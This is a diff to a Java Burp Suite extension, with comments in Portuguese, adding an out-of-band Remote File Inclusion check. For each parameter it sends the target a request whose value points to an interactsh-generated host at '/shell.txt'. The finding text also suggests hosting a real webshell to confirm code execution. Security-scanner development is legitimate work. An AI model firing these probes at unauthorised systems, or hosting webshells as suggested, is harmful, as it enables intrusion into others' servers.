@@ -5,6 +5,7 @@ import burp.api.montoya.http.message.requests.HttpRequest;
 import burp.api.montoya.http.message.responses.HttpResponse;
 import com.rx0.burp.model.Finding;
 import com.rx0.burp.model.Severity;
+import com.rx0.burp.scanner.ScanContext;
 import com.rx0.burp.scanner.VulnCheck;
 
 import java.util.ArrayList;
@@ -47,8 +48,40 @@ public class RfiCheck implements VulnCheck {
 
     @Override
     public List<Finding> executar(MontoyaApi api, String baseUrl) {
+        return executar(api, baseUrl, (ScanContext) null);
+    }
+
+    @Override
+    public List<Finding> executar(MontoyaApi api, String baseUrl, ScanContext ctx) {
         List<Finding> achados = new ArrayList<>();
         String base = baseUrl.endsWith("/") ? baseUrl.substring(0, baseUrl.length() - 1) : baseUrl;
+
+        // --- Confirmação OOB via interactsh: usa um host REAL (que responde HTTP) em vez do domínio falso ---
+        if (ctx != null && ctx.interactsh() != null && ctx.interactsh().isDisponivel()) {
+            for (String param : PARAM_NAMES) {
+                try {
+                    String host = ctx.interactsh().criarProbe(
+                            "RFI confirmado via interação out-of-band no parâmetro '" + param + "'",
+                            Severity.CRITICA,
+                            base,
+                            "O servidor efetivamente buscou/incluiu a URL remota de teste no parâmetro '" + param + "' — " +
+                                    "confirmação inequívoca de Remote File Inclusion, com a requisição HTTP sendo recebida " +
+                                    "de verdade (diferente da detecção por mensagem de erro, que é mais fraca).",
+                            "Nunca passe entrada do usuário para funções de include/require/fopen com suporte a wrapper de URL. " +
+                                    "Desabilite allow_url_include e allow_url_fopen, e use allowlist fixa de arquivos permitidos.",
+                            "1) Hospede um webshell real nesse mesmo tipo de endpoint externo e repita o teste pra confirmar " +
+                                    "execução de código (não só inclusão). 2) O fato de o servidor ter feito a requisição HTTP " +
+                                    "já é RFI confirmado — qualquer conteúdo PHP/JSP/ASP hospedado lá seria executado no alvo.");
+                    if (host != null) {
+                        String payloadOob = "http://" + host + "/shell.txt";
+                        String urlOob = base + "/?" + param + "=" + java.net.URLEncoder.encode(payloadOob, "UTF-8");
+                        api.http().sendRequest(HttpRequest.httpRequestFromUrl(urlOob));
+                    }
+                } catch (Exception e) {
+                    api.logging().logToError("[Rx0] Erro ao disparar probe OOB de RFI (param " + param + "): " + e.getMessage());
+                }
+            }
+        }
 
         for (String param : PARAM_NAMES) {
             try {
